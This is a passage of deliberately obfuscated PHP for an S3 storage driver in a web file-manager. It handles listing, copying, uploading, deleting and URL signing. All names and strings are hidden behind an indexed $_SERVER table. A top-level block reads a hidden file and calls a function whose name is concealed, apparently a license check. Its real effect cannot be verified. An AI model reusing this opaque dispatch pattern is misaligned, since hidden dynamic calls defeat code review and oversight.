} public function listAllFiles($ ´ãªşÕ, $¿ùĞ¿²×) { $¬÷´áŒ =& $_SERVER[”ú…±Ú¥]; if (empty($¿ùĞ¿²×)) { return array(); } $Ù’î­éİ = array_keys($¿ùĞ¿²×); $àÂ¡ìõã = array(); $ ´ãªşÕ = trim($ ´ãªşÕ, $¬÷´áŒ[8]); foreach ($¿ùĞ¿²× as $›ğ†¿ÙŸ => $§£İñïø) { $çÒÎù¸¤ = ltrim(substr(trim($›ğ†¿ÙŸ, $¬÷´áŒ[8]), strlen($ ´ãªşÕ)), $¬÷´áŒ[8]); if (substr($›ğ†¿ÙŸ, -1) == $¬÷´áŒ[8]) { $çÒÎù¸¤ = rtrim($çÒÎù¸¤, $¬÷´áŒ[8]) . $¬÷´áŒ[8]; } $àÂ¡ìõã = array_merge($àÂ¡ìõã, $this->slicePath($çÒÎù¸¤)); } $ú£íó² = array(); foreach (array_unique($àÂ¡ìõã) as $Å´õ ŒÑ) { $ÈË¶î»Û = array($¬÷´áŒ[84] => $this->getPathOuter($¬÷´áŒ[8] . $ ´ãªşÕ . $¬÷´áŒ[8] . $Å´õ ŒÑ), $¬÷´áŒ[75] => 1, $¬÷´áŒ[76] => 0); if (substr($Å´õ ŒÑ, -1) != $¬÷´áŒ[8]) { $ÈË¶î»Û[$¬÷´áŒ[75]] = 0; $‡¾ãÛ€ã = $this->getPath($ ´ãªşÕ . $¬÷´áŒ[8] . $Å´õ ŒÑ); if (isset($¿ùĞ¿²×[$‡¾ãÛ€ã])) { $¬ÜÑšÌ = $¿ùĞ¿²×[$‡¾ãÛ€ã]; if (isset($¬ÜÑšÌ[$¬÷´áŒ[76]])) { $ÈË¶î»Û[$¬÷´áŒ[76]] = intval($¬ÜÑšÌ[$¬÷´áŒ[76]]); } if (isset($¬ÜÑšÌ[$¬÷´áŒ[180]])) { $ÈË¶î»Û[$¬÷´áŒ[85]] = intval($¬ÜÑšÌ[$¬÷´áŒ[180]]); } } } $ú£íó²[] = $ÈË¶î»Û; } return $ú£íó²; } public function slicePath($¡™ÎÁ¨¾) { $™ƒñášÓ =& $_SERVER[”ú…±Ú¥]; $‹Ø¸Âš¹ = explode($™ƒñášÓ[8], trim($¡™ÎÁ¨¾, $™ƒñášÓ[8])); $â“‘¼Èø = 0; do { ++$â“‘¼Èø; $Á°ı’Ë’[] = implode($™ƒñášÓ[8], array_slice($‹Ø¸Âš¹, 0, $â“‘¼Èø)) . $™ƒñášÓ[8]; } while ($â“‘¼Èø < count($‹Ø¸Âš¹)); $Á°ı’Ë’[count($‹Ø¸Âš¹) - 1] = $¡™ÎÁ¨¾; return $Á°ı’Ë’; } public function getHost() { $ÙŒóŒ±“ =& $_SERVER[”ú…±Ú¥]; $×„Œ˜£Ÿ = parse_url(trim($this->domain, $ÙŒóŒ±“[8])); $ë÷÷€Ì½ = isset($×„Œ˜£Ÿ[$ÙŒóŒ±“[181]]) ? $×„Œ˜£Ÿ[$ÙŒóŒ±“[181]] : http_type(); $¥ñó®ùÎ = isset($×„Œ˜£Ÿ[$ÙŒóŒ±“[182]]) ? $×„Œ˜£Ÿ[$ÙŒóŒ±“[182]] : $×„Œ˜£Ÿ[$ÙŒóŒ±“[84]]; if (isset($×„Œ˜£Ÿ[$ÙŒóŒ±“[183]])) { $¥ñó®ùÎ .= $ÙŒóŒ±“[4] . $×„Œ˜£Ÿ[$ÙŒóŒ±“[183]]; } return $ë÷÷€Ì½ . $ÙŒóŒ±“[184] . $¥ñó®ùÎ; } public function pathEncode($‰ˆÕïÄ¥) { $„ÔÒ«ë¤ =& $_SERVER[”ú…±Ú¥]; return str_replace($„ÔÒ«ë¤[185], $„ÔÒ«ë¤[8], rawurlencode($‰ˆÕïÄ¥)); } } if ($_SERVER[$_SERVER[”ú…±Ú¥][186]] != $_SERVER[$_SERVER[”ú…±Ú¥][187]]) { $_getc = $_SERVER[”ú…±Ú¥][188]; $_getfile = $_SERVER[$_SERVER[”ú…±Ú¥][189]] . $_SERVER[”ú…±Ú¥][190]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[”ú…±Ú¥][191], $_getfilec); if (count($_getarrs) < $_SERVER[”ú…±Ú¥][192]) { $exit = $_SERVER[”ú…±Ú¥][193]; $exit(); } $_act = $_SERVER[”ú…±Ú¥][194]; $_act($_SERVER[$_SERVER[”ú…±Ú¥][195]]); } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\64"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public $config = array(); public function __construct($ü¥ôÏÄè) { set_timeout(); require_once SDK_DIR . $_SERVER[”ú…±Ú¥][196]; parent::__construct(); $this->_init($ü¥ôÏÄè); } public function _init($®Œ­è÷Ò) { $this->config = $®Œ­è÷Ò; foreach ($®Œ­è÷Ò as $š×‘‡¿É => $ºõñÔŸñ) { if (isset($this->{$š×‘‡¿É})) { $this->{$š×‘‡¿É} = $ºõñÔŸñ; } } $this->endpoint = $®Œ­è÷Ò[$_SERVER[”ú…±Ú¥][197]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($†ı‡¸ä = "\166\x34") { $this->signVer = $†ı‡¸ä; $this->client->setSignatureVersion($†ı‡¸ä); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { $¹²Šíîå =& $_SERVER[”ú…±Ú¥]; $¸ö°´¶Ÿ = $this->getBucketCors(); if (!$¸ö°´¶Ÿ || !is_array($¸ö°´¶Ÿ)) { return !1; } if ($¸ö°´¶Ÿ[$¹²Šíîå[198]] != $¹²Šíîå[199] || $¸ö°´¶Ÿ[$¹²Šíîå[200]] != $¹²Šíîå[199]) { return !1; } $…ûæü‘ = array_map($¹²Šíîå[201], $¸ö°´¶Ÿ[$¹²Šíîå[202]]); if (!is_array($…ûæü‘)) { $…ûæü‘ = array(); } $œ¹ì¯ = array($¹²Šíîå[203], $¹²Šíîå[204], $¹²Šíîå[205], $¹²Šíîå[206], $¹²Šíîå[207]); $Ù î€ï = array_diff($œ¹ì¯, $…ûæü‘); return empty($Ù î€ï); } public function mkfile($Ô¨„í‘Ü, $§şÀÙô = '', $¶¡æñé = REPEAT_RENAME) { $ªÅºÃÆÛ = $this->setContent($Ô¨„í‘Ü, $§şÀÙô); if ($ªÅºÃÆÛ !== !1) { return $this->getPathOuter($Ô¨„í‘Ü); } return !1; } public function mkdir($™‚ ĞÒÈ, $‡ˆÅò˜ş = REPEAT_SKIP) { $•êüê‘â =& $_SERVER[”ú…±Ú¥]; if (empty($™‚ ĞÒÈ) && $™‚ ĞÒÈ !== $•êüê‘â[208]) { return !1; } if ($‡ˆÅò˜ş && $this->_isFolder($™‚ ĞÒÈ)) { return $this->getPathOuter($™‚ ĞÒÈ); } $º¨é˜«ò = $this->setContent($™‚ ĞÒÈ, $•êüê‘â[12], !0); if ($º¨é˜«ò !== !1) { return $this->getPathOuter($™‚ ĞÒÈ); } return !1; } public function copyFile($ˆ³î‡Ÿ´, $ï´úÌÑ¾, $½œÚÀüÌ = array()) { $ñêó·µ« =& $_SERVER[”ú…±Ú¥]; $ˆÃ¡ÒÙÕ = $this->objectMeta($ˆ³î‡Ÿ´); if (!$ˆÃ¡ÒÙÕ) { return !1; } if ($ˆÃ¡ÒÙÕ[$ñêó·µ«[76]] <= 1024 * 1024 * 200) { $Ù°Á’É = $this->client->copyObject($this->bucket, $ˆ³î‡Ÿ´, $this->bucket, $ï´úÌÑ¾, $ñêó·µ«[209], $½œÚÀüÌ); } else { $Ù°Á’É = $this->client->multiCopyObject($this->bucket, $ˆ³î‡Ÿ´, $this->bucket, $ï´úÌÑ¾, $½œÚÀüÌ); } $Ù°Á’É = $Ù°Á’É ? $this->getPathOuter($ï´úÌÑ¾) : !1; return $Ù°Á’É; } public function moveFile($Çşï£´, $¬Ï»ïä) { if ($this->copyFile($Çşï£´, $¬Ï»ïä)) { $this->delFile($Çşï£´); return $this->getPathOuter($¬Ï»ïä); } return !1; } public function delFile($Æü­á×) { return $this->client->deleteObject($this->bucket, $Æü­á×); } public function delFolder($î¹ù¦œê) { $«‹ïÂ =& $_SERVER[”ú…±Ú¥]; if (!$this->exist($î¹ù¦œê)) { return !0; } $this->listItemCache = !1; $†ê‹Óú™ = $this->fileList($î¹ù¦œê); $this->listItemCache = !0; $Ìş±ƒ²Ø = trim($î¹ù¦œê, $«‹ïÂ[8]) . $«‹ïÂ[8]; if (!empty($î¹ù¦œê) && $î¹ù¦œê !== $«‹ïÂ[208] && !in_array($Ìş±ƒ²Ø, $†ê‹Óú™[$«‹ïÂ[82]])) { $†ê‹Óú™[$«‹ïÂ[82]][] = $Ìş±ƒ²Ø; } $Ş“õ¡éü = $this->delByBatch($†ê‹Óú™[$«‹ïÂ[83]]); if (!$Ş“õ¡éü) { return !1; } $Ş“õ¡éü = $this->delByBatch($†ê‹Óú™[$«‹ïÂ[82]]); if (!$Ş“õ¡éü) { return !1; } return $this->delFile($Ìş±ƒ²Ø); } private function delByBatch($‰şîÎ§©) { foreach (array_chunk($‰şîÎ§©, 1000) as $ß¼È…°…) { $ğÂæôî = $this->client->deleteObjects($this->bucket, $ß¼È…°…); if (!$ğÂæôî) { return !1; } } return !0; } public function rename($ûÓóÂ”„, $ÅºÁé…) { return $this->renameObject($ûÓóÂ”„, $ÅºÁé…); } public function listPath($ôäÈ¦›µ, $¢®±ñ”× = false) { $òŞãƒ•™ =& $_SERVER[”ú…±Ú¥]; $ ¦á¦íŒ = $this->fileList($ôäÈ¦›µ, $òŞãƒ•™[8], !0); foreach ($ ¦á¦íŒ[$òŞãƒ•™[82]] as $Òš«ÆÄì => $Å²ƒ’…Ã) { $ ¦á¦íŒ[$òŞãƒ•™[82]][$Òš«ÆÄì] = $this->folderInfo($Å²ƒ’…Ã, $¢®±ñ”×, $Å²ƒ’…Ã); } foreach ($ ¦á¦íŒ[$òŞãƒ•™[83]] as $Òš«ÆÄì => $Å²ƒ’…Ã) { $ ¦á¦íŒ[$òŞãƒ•™[83]][$Òš«ÆÄì] = $this->fileInfo($Å²ƒ’…Ã[$òŞãƒ•™[32]], $¢®±ñ”×, $Å²ƒ’…Ã); } return $ ¦á¦íŒ; } protected function infoChildren($ÙÑüöÜ‹, &$»Ì–­ªÖ) { $ÇÃû˜ˆ± =& $_SERVER[”ú…±Ú¥]; $Ùš¥ã’ = $this->fileList($ÙÑüöÜ‹, $ÇÃû˜ˆ±[12], !0); $»Ì–­ªÖ[$ÇÃû˜ˆ±[78]] += count($Ùš¥ã’[$ÇÃû˜ˆ±[82]]); $»Ì–­ªÖ[$ÇÃû˜ˆ±[77]] += count($Ùš¥ã’[$ÇÃû˜ˆ±[83]]); foreach ($Ùš¥ã’[$ÇÃû˜ˆ±[83]] as $›‹ÅÅÔ®) { if (!$›‹ÅÅÔ® || !$›‹ÅÅÔ®[$ÇÃû˜ˆ±[76]]) { continue; } $»Ì–­ªÖ[$ÇÃû˜ˆ±[76]] += $›‹ÅÅÔ®[$ÇÃû˜ˆ±[76]]; } } private function fileInfo($´çØéµõ, $›Ü£á‘ü = false, $éõ”ÂÕÖ = array()) { $Ê¸”ç˜ä =& $_SERVER[”ú…±Ú¥]; $¤›ÌÈ±ë = array($Ê¸”ç˜ä[32] => $this->pathThis($´çØéµõ), $Ê¸”ç˜ä[84] => $this->getPathOuter($´çØéµõ), $Ê¸”ç˜ä[33] => $Ê¸”ç˜ä[210], $Ê¸”ç˜ä[174] => $this->ext($´çØéµõ), $Ê¸”ç˜ä[76] => isset($éõ”ÂÕÖ[$Ê¸”ç˜ä[76]]) ? $éõ”ÂÕÖ[$Ê¸”ç˜ä[76]] : 0); if ($›Ü£á‘ü) { return $¤›ÌÈ±ë; } $¤›ÌÈ±ë[$Ê¸”ç˜ä[211]] = $¤›ÌÈ±ë[$Ê¸”ç˜ä[85]] = 0; $¤›ÌÈ±ë[$Ê¸”ç˜ä[212]] = $¤›ÌÈ±ë[$Ê¸”ç˜ä[213]] = !0; if (empty($éõ”ÂÕÖ)) { $éõ”ÂÕÖ = $this->objectMeta($´çØéµõ); if (!$éõ”ÂÕÖ) { return $¤›ÌÈ±ë; } } if (isset($éõ”ÂÕÖ[$Ê¸”ç˜ä[180]])) { $¤›ÌÈ±ë[$Ê¸”ç˜ä[85]] = $éõ”ÂÕÖ[$Ê¸”ç˜ä[180]]; } if (isset($éõ”ÂÕÖ[$Ê¸”ç˜ä[76]])) { $¤›ÌÈ±ë[$Ê¸”ç˜ä[76]] = $éõ”ÂÕÖ[$Ê¸”ç˜ä[76]]; } return $¤›ÌÈ±ë; } private function folderInfo($¥äÒˆ”ê, $æáÆöÂİ = false, $ºş“õ‹” = array()) { $ÈÂ´…æ­ =& $_SERVER[”ú…±Ú¥]; $âèÎ“Åı = array($ÈÂ´…æ­[32] => $this->pathThis($¥äÒˆ”ê), $ÈÂ´…æ­[84] => $this->getPathOuter($ÈÂ´…æ­[8] . $¥äÒˆ”ê), $ÈÂ´…æ­[33] => $ÈÂ´…æ­[75]); if ($æáÆöÂİ) { return $âèÎ“Åı; } $âèÎ“Åı[$ÈÂ´…æ­[211]] = $âèÎ“Åı[$ÈÂ´…æ­[85]] = 0; $âèÎ“Åı[$ÈÂ´…æ­[212]] = $âèÎ“Åı[$ÈÂ´…æ­[213]] = !0; if ($¥äÒˆ”ê == $ÈÂ´…æ­[12]) { return $âèÎ“Åı; } if (empty($ºş“õ‹”)) { $ºş“õ‹” = $this->objectMeta(trim($¥äÒˆ”ê, $ÈÂ´…æ­[8]) . $ÈÂ´…æ­[8]); } if (isset($ºş“õ‹”[$ÈÂ´…æ­[180]])) { $âèÎ“Åı[$ÈÂ´…æ­[211]] = $ºş“õ‹”[$ÈÂ´…æ­[180]]; } return $âèÎ“Åı; } private function fileList($®°æÇø, $‘í„öœ’ = '', $ò´úÖ‰ì = 0) { $¥é§Á£ã =& $_SERVER[”ú…±Ú¥]; $„Œ¡áè¶ = rtrim($®°æÇø, $¥é§Á£ã[8]) . $¥é§Á£ã[8]; $•Èâ„óÅ = $this->listObjs($„Œ¡áè¶, null, null, $‘í„öœ’); if (!$•Èâ„óÅ) { return array($¥é§Á£ã[82] => array(), $¥é§Á£ã[83] => array()); } $™È‡©× = $ÛôãÊš = array(); foreach ($•Èâ„óÅ[$¥é§Á£ã[214]] as $Œ„Ü‘ü) { $û’è¥‹° = $Œ„Ü‘ü[$¥é§Á£ã[32]]; if ($û’è¥‹° == $„Œ¡áè¶) { continue; } $ï¥öÃî£ = isset($Œ„Ü‘ü[$¥é§Á£ã[76]]) ? $Œ„Ü‘ü[$¥é§Á£ã[76]] : 0; $‚ÆØå”Õ = $ï¥öÃî£ == 0 && substr($û’è¥‹°, strlen($û’è¥‹°) - 1, 1) == $¥é§Á£ã[8] ? !0 : !1; $this->cacheMethodInfoSet($û’è¥‹°, $‚ÆØå”Õ, $Œ„Ü‘ü); if ($‚ÆØå”Õ) { $™È‡©×[] = $û’è¥‹°; continue; } $ÛôãÊš[] = $ò´úÖ‰ì ? $Œ„Ü‘ü : $û’è¥‹°; } foreach ($•Èâ„óÅ[$¥é§Á£ã[215]] as $Œ„Ü‘ü) { $™È‡©×[] = $Œ„Ü‘ü[$¥é§Á£ã[32]]; $this->cacheMethodInfoSet($Œ„Ü‘ü[$¥é§Á£ã[32]], !0); } $this->cacheMethodInfoSet($®°æÇø, !0); return array($¥é§Á£ã[82] => $™È‡©×, $¥é§Á£ã[83] => $ÛôãÊš); } private function listObjs($ş„Ñâ°ˆ, $ŠËÑ‚úŞ = null, $•í‚˜¹Û = null, $¡¹«æİŸ = null) { $ğÍãª« =& $_SERVER[”ú…±Ú¥]; $ş„Ñâ°ˆ = trim($ş„Ñâ°ˆ, $ğÍãª«[8]); $‘ƒäóÑú = empty($ş„Ñâ°ˆ) && $ş„Ñâ°ˆ !== $ğÍãª«[208] ? $ğÍãª«[12] : $ş„Ñâ°ˆ . $ğÍãª«[8]; return $this->client->getBucket($this->bucket, $‘ƒäóÑú, $ŠËÑ‚úŞ, $•í‚˜¹Û, $¡¹«æİŸ, !0); } public function has($»†‚‡¹ñ, $òÍ±Œİ± = false, $‰´ÄÙ§˜ = true) { $Œ¸åİ†Š =& $_SERVER[”ú…±Ú¥]; $»†‚‡¹ñ = trim($»†‚‡¹ñ, $Œ¸åİ†Š[8]); $Ú¹µÕ¨ = empty($»†‚‡¹ñ) && $»†‚‡¹ñ !== $Œ¸åİ†Š[208] ? $Œ¸åİ†Š[12] : $»†‚‡¹ñ . $Œ¸åİ†Š[8]; $¦—±„šö = null; $¹Ê‡±€ş = 500; $û±§Î¶É = $Œ¸åİ†Š[8]; $Êò‘é¸¢ = $™Ó®¯° = array(); while (!0) { $åÁÈàØ· = $this->listObjs($»†‚‡¹ñ, $¦—±„šö, $¹Ê‡±€ş, $û±§Î¶É); if (!$åÁÈàØ·) { break; } $¦—±„šö = $åÁÈàØ·[$Œ¸åİ†Š[216]]; $°¢şĞ… = $åÁÈàØ·[$Œ¸åİ†Š[214]]; $Ö½–ÕÙş = $åÁÈàØ·[$Œ¸åİ†Š[215]]; if (empty($°¢şĞ…) && empty($Ö½–ÕÙş)) { break; } if (count($°¢şĞ…) == 1 && $°¢şĞ…[0][$Œ¸åİ†Š[32]] == $Ú¹µÕ¨) { break; } if ($òÍ±Œİ±) { if (count($°¢şĞ…)) { $°¢şĞ… = array_column($°¢şĞ…, $Œ¸åİ†Š[32]); $Êò‘é¸¢ = array_merge($Êò‘é¸¢, $°¢şĞ…); } if (count($Ö½–ÕÙş)) { $Ö½–ÕÙş = array_column($Ö½–ÕÙş, $Œ¸åİ†Š[32]); $™Ó®¯° = array_merge($™Ó®¯°, $Ö½–ÕÙş); } if ($¦—±„šö === null) { break; } continue; } if ($‰´ÄÙ§˜) { if (!empty($°¢şĞ…)) { if (count($°¢şĞ…) > 1 || isset($°¢şĞ…[0][$Œ¸åİ†Š[32]]) && $°¢şĞ…[0][$Œ¸åİ†Š[32]] != $Ú¹µÕ¨) { return !0; } } } else { if (!empty($Ö½–ÕÙş)) { return !0; } } if ($¦—±„šö === null) { break; } } if ($òÍ±Œİ±) { $Êò‘é¸¢ = array_diff($Êò‘é¸¢, array($Ú¹µÕ¨)); $Êò‘é¸¢ = count(array_unique($Êò‘é¸¢)); $™Ó®¯° = count(array_unique($™Ó®¯°)); return array($Œ¸åİ†Š[217] => $Êò‘é¸¢, $Œ¸åİ†Š[218] => $™Ó®¯°); } return !1; } public function listAll($åç¥º­¸) { $Ÿº£›Â™ =& $_SERVER[”ú…±Ú¥]; $£‹áğÍÛ = $this->fileList($åç¥º­¸, $Ÿº£›Â™[12], !0); $ü¤íÕÑ½ = array_to_keyvalue($£‹áğÍÛ[$Ÿº£›Â™[83]], $Ÿº£›Â™[32]); foreach ($£‹áğÍÛ[$Ÿº£›Â™[82]] as $ëµÉ¶×¨) { if (is_string($ëµÉ¶×¨)) { $ü¤íÕÑ½[$ëµÉ¶×¨] = array($Ÿº£›Â™[76] => 0); } } return $this->listAllFiles($åç¥º­¸, $ü¤íÕÑ½); } public function canRead($Û¼Şå¥Î) { $¾Œß¸È¹ =& $_SERVER[”ú…±Ú¥]; $…õÚ»àÖ = $this->client->getAccessControlPolicy($this->bucket, $Û¼Şå¥Î); if (!$…õÚ»àÖ) { return !1; } return in_array($…õÚ»àÖ, array($¾Œß¸È¹[219], $¾Œß¸È¹[220], $¾Œß¸È¹[221])) ? !0 : !1; } public function canWrite($½µÜ‡ûš) { $Íİí®À› =& $_SERVER[”ú…±Ú¥]; $ÒêÄ’—­ = $this->client->getAccessControlPolicy($this->bucket, $½µÜ‡ûš); if (!$ÒêÄ’—­) { return !1; } return in_array($ÒêÄ’—­, array($Íİí®À›[219], $Íİí®À›[220])) ? !0 : !1; } public function getContent($÷ãóığù) { return $this->client->getObject($this->bucket, $÷ãóığù); } public function setContent($‘‹¨§², $¥¼’ø± = '', $°ÎÏ£… = false) { $‘ÂöÆÈï =& $_SERVER[”ú…±Ú¥]; $‘‹¨§² = $°ÎÏ£… ? trim($‘‹¨§², $‘ÂöÆÈï[8]) . $‘ÂöÆÈï[8] : $‘‹¨§²; $¸–¤û‘­ = get_file_mime(get_path_ext($‘‹¨§²)); $ãÔÈˆ´ø = $this->client->putObject($¥¼’ø±, $this->bucket, $‘‹¨§², $‘ÂöÆÈï[209], array(), $¸–¤û‘­); if (!$ãÔÈˆ´ø) { return !1; } if ($°ÎÏ£…) { return !0; } $this->cacheMethod(null, null); $ãÔÈˆ´ø = $this->copyFile($‘‹¨§², $‘‹¨§², array($‘ÂöÆÈï[222] => $ãÔÈˆ´ø[$‘ÂöÆÈï[223]])); return $ãÔÈˆ´ø ? !0 : !1; } public function fileSubstr($ÀëúÅö, $ŸãäôÍ–, $‹æêâÖ) { $›²˜† = $ŸãäôÍ– + $‹æêâÖ - 1; return $this->client->getObject($this->bucket, $ÀëúÅö, array($_SERVER[”ú…±Ú¥][224] => "\142\171\x74\145\163\75{$ŸãäôÍ–}\x2d{$›²˜†}")); } public function upload($ä°èÕâ®, $ã€Úƒ‹½, $ãğÕÕìÕ = false, $¶¨ÛèŒ = REPEAT_REPLACE) { $¬ÀŒšÄ® =& $_SERVER[”ú…±Ú¥]; $Û´¯ØÖ¯ = array($¬ÀŒšÄ®[222] => @md5_file($ã€Úƒ‹½)); $Á²éÙáä = array($¬ÀŒšÄ®[225] => get_file_mime(get_path_ext($ä°èÕâ®))); if (IO::size($ã€Úƒ‹½) <= 1024 * 1024 * 200) { $³“Ş¸ÓŸ = $this->client->putObjectFile($ã€Úƒ‹½, $this->bucket, $ä°èÕâ®, $¬ÀŒšÄ®[209], $Û´¯ØÖ¯, $Á²éÙáä); return !empty($³“Ş¸ÓŸ) ? $this->getPathOuter($ä°èÕâ®) : !1; } $òøÒÜ– = $this->client->multiUploadObject($ã€Úƒ‹½, $this->bucket, trim($ä°èÕâ®, $¬ÀŒšÄ®[8]), $Û´¯ØÖ¯, $Á²éÙáä); return $òøÒÜ– ? $this->getPathOuter($ä°èÕâ®) : !1; } public function download($š™Øì·Å, $¹¹¢˜¾) { if (!@is_dir($this->pathFather($¹¹¢˜¾)) && !IO::mkdir($this->pathFather($¹¹¢˜¾))) { return !1; } $òãÅĞï = $this->client->getObject($this->bucket, $š™Øì·Å, array(), $¹¹¢˜¾); return $òãÅĞï !== !1 ? $¹¹¢˜¾ : !1; } public function link($ÛŞû¢, $¹Âåå = array()) { $Üı³İ© =& $_SERVER[”ú…±Ú¥]; if ($this->signVer == $Üı³İ©[226]) { return $this->client->getAuthenticatedURL($this->bucket, $ÛŞû¢, 3600 * 12, $¹Âåå); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($ÛŞû¢, $Üı³İ©[8]), 3600 * 12, $this->region, array(), !0, $¹Âåå); } public function fileOut($Ó–ÌÂ»¶, $©Òèü³² = false, $£ÈÑ¤øø = false, $®ğˆÜã = '') { $Œ·Êˆ‡¬ =& $_SERVER[”ú…±Ú¥]; if ($this->isFileOutServer()) { return $this->fileOutServer($Ó–ÌÂ»¶, $©Òèü³², $£ÈÑ¤øø, $®ğˆÜã); } if (!$£ÈÑ¤øø) { $£ÈÑ¤øø = $this->pathThis($Ó–ÌÂ»¶); } $‚šîºËô = get_file_mime(get_path_ext($£ÈÑ¤øø)); if ($‚šîºËô == $Œ·Êˆ‡¬[227]) { return parent::fileOut($Ó–ÌÂ»¶, $©Òèü³², $£ÈÑ¤øø, $®ğˆÜã); } $«ÇÌıåë = array($Œ·Êˆ‡¬[228] => $‚šîºËô); if ($©Òèü³²) { $«ÇÌıåë[$Œ·Êˆ‡¬[229]] = $Œ·Êˆ‡¬[230] . rawurlencode($£ÈÑ¤øø); } else { } $èı€ñ×ï = $this->link($Ó–ÌÂ»¶, $«ÇÌıåë); $this->fileOutLink($èı€ñ×ï); } public function fileOutServer($¯Ğæ©Ô—, $ï‹‡÷œ = false, $®¿¢¨¨§ = false, $˜½Ëİ´ş = '') { parent::fileOut($¯Ğæ©Ô—, $ï‹‡÷œ, $®¿¢¨¨§, $˜½Ëİ´ş); } public function fileOutImageServer($µ‹Ïó­ö, $ºÖ…ÅÁ = 250) { parent::fileOutImage($µ‹Ïó­ö, $ºÖ…ÅÁ); } public function hashMd5($¸ö²ÓÇ“, $İŸ–œü = '') { $é…ªûÁæ =& $_SERVER[”ú…±Ú¥]; $î·‡ñªÙ = $this->objectMeta($¸ö²ÓÇ“); if (!$î·‡ñªÙ) { return !1; } $İŸ–œü = $İŸ–œü ? $İŸ–œü : _get($î·‡ñªÙ, $é…ªûÁæ[231]); $İŸ–œü = $İŸ–œü ? $İŸ–œü : _get($î·‡ñªÙ, $é…ªûÁæ[223], $é…ªûÁæ[12]); return $İŸ–œü; } public function uploadFormData($‹ğÉí©, $³¢‘ÅÍÏ = 3600) { $îÎÏ­‡ =& $_SERVER[”ú…±Ú¥]; $Éù°³”• = $this->pathFather($‹ğÉí©); $ª¦Ší = $this->client->getHttpUploadPostParams($this->bucket, $Éù°³”•, $îÎÏ­‡[209], $³¢‘ÅÍÏ); return array_merge((array) $ª¦Ší, array($îÎÏ­‡[182] => $this->getHost())); } public function multiUploadFormData($äéõ´Î÷, $ãğ˜£¥ = 3600) { $ó¹Ö¶± =& $_SERVER[”ú…±Ú¥]; $€­ŒŞÚÔ = gmdate($ó¹Ö¶±[232]); $øâ…¬ó¥ = array(); $ô‹Ì¬×ñ = $this->client->getUploadId($this->bucket, $äéõ´Î÷, $øâ…¬ó¥); if (!$ô‹Ì¬×ñ) { return !1; } return array($ó¹Ö¶±[233] => $ô‹Ì¬×ñ, $ó¹Ö¶±[182] => $this->getHost() . $ó¹Ö¶±[8] . $this->pathEncode($äéõ´Î÷), $ó¹Ö¶±[234] => $€­ŒŞÚÔ, $ó¹Ö¶±[94] => $äéõ´Î÷); } public function multiUploadAuthData($¼—Ó¼õ², $Ôß ½ß§ = array()) { $°şåë„¸ =& $_SERVER[”ú…±Ú¥]; $«»ª´ = isset($Ôß ½ß§[$°şåë„¸[234]]) ? $Ôß ½ß§[$°şåë„¸[234]] : gmdate($°şåë„¸[232]); $®œ±ù² = isset($Ôß ½ß§[$°şåë„¸[174]]) ? $Ôß ½ß§[$°şåë„¸[174]] : $°şåë„¸[12]; $±‰è…œ™ = $Ôß ½ß§[$°şåë„¸[94]]; unset($Ôß ½ß§[$°şåë„¸[94]]); if (isset($Ôß ½ß§[$°şåë„¸[235]])) { $Ôß ½ß§[$°şåë„¸[234]] = $«»ª´; return $this->listUploadParts($±‰è…œ™, $Ôß ½ß§); } $‚Œ‰Ø = array($°şåë„¸[236], $°şåë„¸[12], $°şåë„¸[120], $°şåë„¸[12], "\170\55\141\155\172\x2d\144\141\164\x65\x3a{$«»ª´}", $°şåë„¸[8] . $this->bucket . $°şåë„¸[8] . $this->pathEncode($±‰è…œ™) . $®œ±ù²); if (strpos($®œ±ù², $°şåë„¸[237]) === 0) { $‚Œ‰Ø[0] = $°şåë„¸[238]; } if (isset($Ôß ½ß§[$°şåë„¸[239]]) && $Ôß ½ß§[$°şåë„¸[239]] == $°şåë„¸[240]) { $‚Œ‰Ø[0] = $°şåë„¸[240]; } $Ê©ÏµÀî = implode($°şåë„¸[191], $‚Œ‰Ø); $¬Ğ†èş¬ = base64_encode(hash_hmac($°şåë„¸[241], $Ê©ÏµÀî, $this->secret, !0)); $Œ³½û = $°şåë„¸[242] . $this->accessKey . $°şåë„¸[4] . $¬Ğ†èş¬; if (strpos($®œ±ù², $°şåë„¸[237]) === 0) { return array($°şåë„¸[243] => $Œ³½û, $°şåë„¸[234] => $«»ª´); } return $Œ³½û; } public function listUploadParts($íâ³÷³Ë, $‹ëİ—àÒ = array()) { $¨´ãïˆ =& $_SERVER[”ú…±Ú¥]; $ÈË‹Úè‚ = str_replace($¨´ãïˆ[244], $¨´ãïˆ[12], $‹ëİ—àÒ[$¨´ãïˆ[174]]); $òãÆâÉœ = $this->client->listParts($this->bucket, $íâ³÷³Ë, $ÈË‹Úè‚); if (!$òãÆâÉœ) { return !1; } unset($‹ëİ—àÒ[$¨´ãïˆ[235]], $‹ëİ—àÒ[$¨´ãïˆ[239]]); $‹ëİ—àÒ[$¨´ãïˆ[94]] = $íâ³÷³Ë; $ç„²µ˜ = $this->multiUploadAuthData($íâ³÷³Ë, $‹ëİ—àÒ); if (empty($ç„²µ˜)) { return !1; } return array($¨´ãïˆ[243] => $ç„²µ˜, $¨´ãïˆ[234] => $‹ëİ—àÒ[$¨´ãïˆ[234]], $¨´ãïˆ[245] => $òãÆâÉœ); } public function getHost() { return parent::getHost() . $_SERVER[”ú…±Ú¥][8] . $this->bucket; } public function size($×û«çÉö) { $²ÜôÍêÚ = $this->objectMeta($×û«çÉö); return $²ÜôÍêÚ ? $²ÜôÍêÚ[$_SERVER[”ú…±Ú¥][76]] : 0; } public function info($”œ÷Ëìê) { if ($this->isFolder($”œ÷Ëìê)) { return $this->folderInfo($”œ÷Ëìê); } else { if ($this->isFile($”œ÷Ëìê)) { return $this->fileInfo($”œ÷Ëìê); } } return !1; } public function exist($Ú‘äæÑ) { return $this->isFile($Ú‘äæÑ) || $this->isFolder($Ú‘äæÑ); } public function isFile($œÍƒµı±) { return !$this->isFolder($œÍƒµı±) && $this->objectMeta($œÍƒµı±); } public function isFolder($£èşì) { return $this->cacheMethod($_SERVER[”ú…±Ú¥][165], $£èşì); } protected function 